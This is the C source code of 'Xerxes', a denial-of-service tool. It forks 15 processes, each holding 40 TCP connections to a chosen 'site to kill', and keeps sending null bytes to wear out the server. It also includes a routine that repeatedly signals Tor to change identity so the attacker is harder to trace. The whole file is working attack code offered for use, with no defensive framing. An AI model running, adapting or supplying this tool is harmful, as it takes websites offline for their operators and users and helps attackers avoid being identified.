//Xerxes, code assumed to be public domain
//by tH3j3st3r

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
//#include "config.h"

int attacks = 0;

/*
 * This function just abstracts sockets to an easier way of calling them.
 */
int tcp_make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
//	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	//fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}


/*
 * Generic stop function
 */
void tcp_broke(int s) {
	// do nothing
}

#define CONNECTIONS 40
#define THREADS 15

/*
 * This function will send a null character to the
 * target site, which wastes the daemon's time, and is
 * why this program works.
 */
void tcp_attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, g=1, r;
	for(x=0; x!= CONNECTIONS; x++)
		sockets[x]=0;
	signal(SIGPIPE, &tcp_broke);
	printf("NOTICE %s :TCP-Xerexing %s.\n", host);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = tcp_make_socket(host, port);
			r=write(sockets[x], "\0", 1);
			//r=write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 1);
			if(r == -1) {
				close(sockets[x]); 
				sockets[x] = tcp_make_socket(host, port);
			} else {
//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
			}
			attacks++;
			fprintf(stderr, "[%i:\tvolley sent, %d\t]\n", id, attacks);
		}
		usleep(300000);
	}
}

/*
 * This function will reset your tor identity, VERY USEFUL
 */
void tcp_cycle_identity() {
	int r;
	int socket = tcp_make_socket("localhost", "9050");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
		usleep(300000);
	}
}

int xersextcp_main(int argc, char **argv) {
	int x;
	if(argc !=3) {
		printf("xerxes Usage Summary:\n%s [site to kill] [port, 80 is best]\nYour tor identity has been reset\n\n", argv[0]);
		tcp_cycle_identity();
		
		return 0;
	}
	for(x=0; x != THREADS; x++) {
		if(fork())
			tcp_attack(argv[1], argv[2], x);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}
